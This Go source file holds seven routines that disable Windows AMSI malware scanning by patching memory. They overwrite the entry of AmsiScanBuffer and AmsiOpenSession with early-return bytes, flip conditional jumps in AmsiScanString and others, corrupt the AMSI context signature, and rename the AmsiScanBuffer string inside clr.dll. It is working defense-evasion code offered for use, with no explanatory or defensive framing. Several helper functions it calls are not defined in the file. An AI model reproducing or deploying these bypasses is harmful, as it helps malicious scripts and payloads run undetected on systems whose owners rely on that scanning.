package main

import (
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Patch Beginning of AmsiScanBuffer
func PatchAmsi() error {
	NTDLL := windows.NewLazyDLL("amsi.dll")
	pAmsi := NTDLL.NewProc("AmsiScanBuffer").Addr()
	pShellcode := []byte{0x33, 0xC0, 0xC3}

	return PatchFunction(pAmsi, pShellcode)
}

// Patch je of AmsiScanBuffer
func PatchAmsi2() error {
	NTDLL := windows.NewLazyDLL("amsi.dll")
	pAmsi := NTDLL.NewProc("AmsiScanBuffer").Addr()
	pJe := SearchForJeInstructionFromAddress(pAmsi)
	pShellcode := []byte{0x75}
	return PatchFunction(pJe, pShellcode)
}

// Patch Context of AmsiOpenSession
func PatchAmsi3() error {
	AMSI_SIGNATURE := 0x49534D41
	x64_RET_INSTRUCTION_OPCODE := 0xC3
	x64_INT3_INSTRUCTION_OPCODE := 0xCC

	NTDLL := windows.NewLazyDLL("amsi.dll")

	pAmsi := NTDLL.NewProc("AmsiOpenSession").Addr()
	startAddress := pAmsi

	i := 0
	address := startAddress
	addressPlusOne := startAddress + uintptr(i+1)*uintptr(unsafe.Sizeof(byte(0)))
	addressPlusTwo := startAddress + uintptr(i+2)*uintptr(unsafe.Sizeof(byte(0)))
	for {
		// CHeck Opcode
		opcode := *(*byte)(unsafe.Pointer(address))
		Println(fmt.Sprintf("Opcode %0X", opcode))
		opcodePlusOne := *(*byte)(unsafe.Pointer(addressPlusOne))
		opcodePlusTwo := *(*byte)(unsafe.Pointer(addressPlusTwo))
		Println(fmt.Sprintf("Opcode+1 %0X", opcodePlusOne))
		if opcode == byte(x64_RET_INSTRUCTION_OPCODE) && opcodePlusOne == byte(x64_INT3_INSTRUCTION_OPCODE) && opcodePlusTwo == byte(x64_INT3_INSTRUCTION_OPCODE) {
			addresdebug := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
			Println(fmt.Sprintf("Found ret address at %0x", addresdebug))
			break
		}

		// INcrement address
		i++
		address = startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
		addressPlusOne = startAddress + uintptr(i+1)*uintptr(unsafe.Sizeof(byte(0)))
		addressPlusTwo = startAddress + uintptr(i+2)*uintptr(unsafe.Sizeof(byte(0)))
	}
	var amsiContextAddress uintptr
	for i > 0 {
		addressAtI := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
		opcodeAtI := *(*uint32)(unsafe.Pointer(addressAtI))
		if opcodeAtI == uint32(AMSI_SIGNATURE) {
			amsiContextAddress = addressAtI
			Println(fmt.Sprintf("Found je address at %0x", amsiContextAddress))

			break
		}
		i--
	}
	if amsiContextAddress == pAmsi {
		return errors.New("Patch Failed. Maybe you are on windows 11")
	}
	pShellcode := []byte{0x55}
	return PatchFunction(amsiContextAddress, pShellcode)
}

// Patch beginning of AmsiOpenSession
func PatchAmsi4() error {
	NTDLL := windows.NewLazyDLL("amsi.dll")
	pAmsi := NTDLL.NewProc("AmsiOpenSession").Addr()
	pShellcode := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	return PatchFunction(pAmsi, pShellcode)
}

// Patch je of AmsiOpenSession
func PatchAmsi5() error {
	NTDLL := windows.NewLazyDLL("amsi.dll")
	pAmsi := NTDLL.NewProc("AmsiOpenSession").Addr()
	pJe := SearchForJeInstructionFromAddress(pAmsi)
	pShellcode := []byte{0x75}
	return PatchFunction(pJe, pShellcode)
}

// Patch je of AmsiScanString
func PatchAmsi6() error {
	NTDLL := windows.NewLazyDLL("amsi.dll")
	pAmsi := NTDLL.NewProc("AmsiScanString").Addr()
	pJe := SearchForJeInstructionFromAddress(pAmsi)
	pShellcode := []byte{0x75}
	return PatchFunction(pJe, pShellcode)
}

// Hide AmsiScanBuffer From CLR.DLL
func PatchAmsi7() error {
	Println("Inside PatchAmsi7")
	CLRDLL := windows.NewLazyDLL("clr.dll")
	if err := CLRDLL.Load(); err != nil {
		return fmt.Errorf("failed to load clr.dll: %w", err)
	}
	var modInfo windows.ModuleInfo
	Println("Calling Get Module Info")
	err := windows.GetModuleInformation(windows.Handle(^uintptr(0)), windows.Handle(CLRDLL.Handle()), &modInfo, uint32(unsafe.Sizeof(modInfo)))
	Println("Called Get Module Info")
	Println(modInfo)
	if err != nil {
		return err
	}

	targString := "AmsiScanBuffer"
	stringSize := len(targString)
	startAddress := CLRDLL.Handle()
	Println("Start addredd")

	amsiStringAddress := uintptr(0)
    Println(int(modInfo.SizeOfImage)-stringSize)
	for i := 0; i < int(modInfo.SizeOfImage)-stringSize; i++ {

		addressAtI := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
		if memcmp(addressAtI, []byte(targString)) {
			amsiStringAddress = addressAtI
			Println(fmt.Sprintf("Found amsiStringAddress address at %0x", amsiStringAddress))

			break
		}
	}

	if amsiStringAddress == 0 {
		return errors.New("AmsiScanBuffer not found in CLR.DLL... Maybe it is already patched")
	}

	return PatchFunction(amsiStringAddress, []byte("AsmiScanBuffer"))
}
